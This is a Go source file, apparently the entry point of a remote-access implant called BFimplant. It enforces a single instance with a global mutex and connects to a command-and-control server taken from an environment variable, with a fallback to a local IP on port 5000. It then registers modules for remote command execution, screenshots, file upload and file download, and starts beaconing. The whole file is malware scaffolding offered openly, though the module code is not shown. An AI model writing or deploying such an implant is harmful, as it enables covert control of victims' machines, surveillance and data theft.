package main

import (
	"fmt"
	"os"
	"BFimplant/mymutex"
	"BFimplant/modules"
	"syscall"

)




func main() {
	mutexName := "Global\\BFimplantMutex"
	

	// Create a new mutex
	mutex, err := mymutex.CreateMutex(mutexName)
	if err != nil {
		fmt.Println("Error creating mutex:", err)
		return
	}
	defer syscall.CloseHandle(mutex) // Ensure the handle is closed when done

	waitResult, _ := mymutex.WaitForSingleObject(mutex,0)
	
	if waitResult == syscall.WAIT_OBJECT_0 {
		//run the 
		c2ServerURL := os.Getenv("C2_URL")
		if c2ServerURL == "" {
			c2ServerURL = "http://192.168.1.247:5000"
		}
		defer mymutex.ReleaseMutex(mutex)
		implant := NewImplant(c2ServerURL)
		

		// Register modules
		implant.Modules["cmd"] = modules.NewExecuteModule()
		implant.Modules["ping"] = modules.NewPingModule()
		implant.Modules["screenshot"] = modules.NewScreenshotModule()
		implant.Modules["upload"] = modules.NewUploadModule()
		implant.Modules["download"] = modules.NewDownloadModule()

		implant.Start()

		
	}
	
}
